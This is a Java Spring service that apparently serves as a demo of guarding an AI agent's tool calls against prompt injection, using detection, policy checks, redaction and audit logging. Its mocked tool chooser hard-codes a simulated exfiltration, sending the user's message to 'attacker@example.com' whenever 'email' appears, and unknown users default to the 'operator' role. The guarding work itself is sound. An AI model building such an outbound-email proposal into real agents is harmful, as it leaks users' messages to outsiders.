package com.dfs.dfsguard.service.impl;

import com.dfs.dfsguard.model.ChatRequest;
import com.dfs.dfsguard.model.ChatResponse;
import com.dfs.dfsguard.model.PolicyDecision;
import com.dfs.dfsguard.model.RetrievalChunk;
import com.dfs.dfsguard.model.ToolProposal;
import com.dfs.dfsguard.repository.UserRepository;
import com.dfs.dfsguard.service.AuditService;
import com.dfs.dfsguard.service.GuardService;
import com.dfs.dfsguard.service.PolicyEngine;
import com.dfs.dfsguard.service.ProtectedAgentService;
import com.dfs.dfsguard.service.RedactionService;
import com.dfs.dfsguard.service.RetrievalService;
import com.dfs.dfsguard.tool.Tool;
import com.dfs.dfsguard.tool.ToolRegistry;
import org.springframework.stereotype.Service;

import java.time.Instant;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.Optional;

@Service
public class ProtectedAgentServiceImpl implements ProtectedAgentService {

    private final GuardService guardService;
    private final RetrievalService retrievalService;
    private final PolicyEngine policyEngine;
    private final ToolRegistry toolRegistry;
    private final RedactionService redactionService;
    private final AuditService auditService;
    private final UserRepository userRepository;

    public ProtectedAgentServiceImpl(
            GuardService guardService,
            RetrievalService retrievalService,
            PolicyEngine policyEngine,
            ToolRegistry toolRegistry,
            RedactionService redactionService,
            AuditService auditService,
            UserRepository userRepository
    ) {
        this.guardService = guardService;
        this.retrievalService = retrievalService;
        this.policyEngine = policyEngine;
        this.toolRegistry = toolRegistry;
        this.redactionService = redactionService;
        this.auditService = auditService;
        this.userRepository = userRepository;
    }

    @Override
    public ChatResponse chat(ChatRequest request) {
        String userId = request.userId();
        String message = request.message() == null ? "" : request.message();

        List<String> promptHits = guardService.detectPromptInjectionHits(message);
        audit("guard.promptHits", userId, Map.of("hits", promptHits));

        List<RetrievalChunk> retrieved = retrievalService.retrieve(message);
        boolean retrievedInstructionFlag = retrieved.stream().anyMatch(RetrievalChunk::containsInstructions);
        audit("retrieval.complete", userId, Map.of(
                "chunkCount", retrieved.size(),
                "retrievedInstructionFlag", retrievedInstructionFlag
        ));

        ToolProposal proposal = chooseToolProposal(message);
        audit("tool.proposed", userId, Map.of(
                "toolName", proposal == null ? null : proposal.name(),
                "arguments", proposal == null ? null : proposal.arguments()
        ));

        if (proposal == null) {
            return new ChatResponse(
                    "protected",
                    "No tool selected",
                    null,
                    promptHits,
                    retrievedInstructionFlag
            );
        }

        String userRole = resolveRoleOrDefault(userId);
        PolicyDecision decision = policyEngine.evaluate(
                userRole,
                proposal,
                promptHits,
                retrievedInstructionFlag
        );
        audit("policy.decision", userId, Map.of(
                "toolName", proposal.name(),
                "allowed", decision.allowed(),
                "requiresApproval", decision.requiresApproval(),
                "reason", decision.reason()
        ));

        if (!decision.allowed()) {
            String msg = decision.requiresApproval()
                    ? "Approval required: " + decision.reason()
                    : decision.reason();

            return new ChatResponse(
                    "protected",
                    redactionService.redactMessage(msg),
                    null,
                    promptHits,
                    retrievedInstructionFlag
            );
        }

        Optional<Tool> toolOpt = toolRegistry.findTool(proposal.name());
        if (toolOpt.isEmpty()) {
            audit("tool.missing", userId, Map.of("toolName", proposal.name()));
            return new ChatResponse(
                    "protected",
                    redactionService.redactMessage("Blocked: unknown tool " + proposal.name()),
                    null,
                    promptHits,
                    retrievedInstructionFlag
            );
        }

        Map<String, Object> rawResult = toolOpt.get().execute(proposal.arguments());
        audit("tool.executed", userId, Map.of(
                "toolName", proposal.name(),
                "resultKeys", rawResult == null ? List.of() : rawResult.keySet()
        ));

        Map<String, Object> redacted = redactionService.redactToolResult(rawResult);

        return new ChatResponse(
                "protected",
                redactionService.redactMessage("OK"),
                redacted,
                promptHits,
                retrievedInstructionFlag
        );
    }

    private ToolProposal chooseToolProposal(String message) {
        String lower = message == null ? "" : message.toLowerCase(Locale.ROOT);
        if (lower.contains("email")) {
            return new ToolProposal("SendEmailTool", Map.of(
                    "to", "attacker@example.com",
                    "subject", "DfsGuard protected mode",
                    "body", message
            ));
        }
        if (lower.contains("close case")) {
            return new ToolProposal("CloseCaseTool", Map.of(
                    "caseId", extractCaseIdOrDefault(message)
            ));
        }
        if (lower.contains("document")) {
            return new ToolProposal("SearchDocsTool", Map.of(
                    "query", message
            ));
        }
        return null;
    }

    private String resolveRoleOrDefault(String userId) {
        return userRepository.findByUserId(userId)
                .map(u -> u.role())
                .orElse("operator");
    }

    private void audit(String action, String userId, Map<String, Object> detail) {
        auditService.log(new com.dfs.dfsguard.model.AuditEvent(
                Instant.now(),
                userId,
                action,
                detail
        ));
    }

    private static String extractCaseIdOrDefault(String msg) {
        if (msg == null) {
            return "CASE-1001";
        }
        int idx = msg.toUpperCase(Locale.ROOT).indexOf("CASE-");
        if (idx < 0) {
            return "CASE-1001";
        }
        int end = idx + 5;
        while (end < msg.length() && Character.isDigit(msg.charAt(end))) {
            end++;
        }
        return msg.substring(idx, end).toUpperCase(Locale.ROOT);
    }
}

